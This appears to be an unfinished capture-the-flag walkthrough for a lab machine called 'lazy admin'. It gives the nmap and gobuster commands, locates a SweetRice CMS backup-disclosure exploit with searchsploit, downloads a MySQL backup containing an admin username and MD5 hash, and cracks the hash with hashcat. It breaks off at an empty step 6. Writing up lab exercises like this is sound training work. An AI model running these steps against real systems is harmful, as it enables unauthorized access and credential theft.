# lazy admin final

## _step 1

scan host:

***sudo nmap -sV -Pn -p- -T4 `host-ip`***

 __open__ ports:

      port 22 ssh - OpenSSH 7.2p2
      
      port 80 http - Apache httpd 2.4.18

## _step 2

scan for directories:

***gobuster dir -u http://`host-ip` -w `/usr/share/wordlists/dirb/common.txt`***

      /.htpasswd
      /.htaccess
      /content
      /server-status

another scan in **/content**

***gobuster dir -u http://`host-ip`/content/ -w `/usr/share/wordlists/dirb/common.txt`***

      /.htpasswd
      /.htaccess
      /_themes
      /as
      /attachment
      /images
      /inc
      /index.php
      /js

## _step 3

in */index.php* we found a cms named **sweet rice** 

***searchsploit sweet rice***

---->   **SweetRice 1.5.1 - Backup Disclosure /php/webapps/40718.py**

***cat /usr/share/exploitdb/exploit/php/webapps/40718.py***

      Proof of Concept :

      You can access to all mysql backup and download them from this directory.
      
      http://host-ip/inc/mysql_backup/

----> **http://`host-ip`/content/inc/mysql_backup/**

## _step 4

lets get the mysql backup file

***wget http://`host-ip`/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql***

in this file we can find credentials

name: **manager**
passwordhash: **42f749ade7f9e195bf475f37a44cafcb**

## _step 5

lets crack the **md5** passwordhash with hashcat

***hashcat -m 0 `yourfile.txt` /usr/share/wordlists/rockyou.txt***

## _step 6






   
    
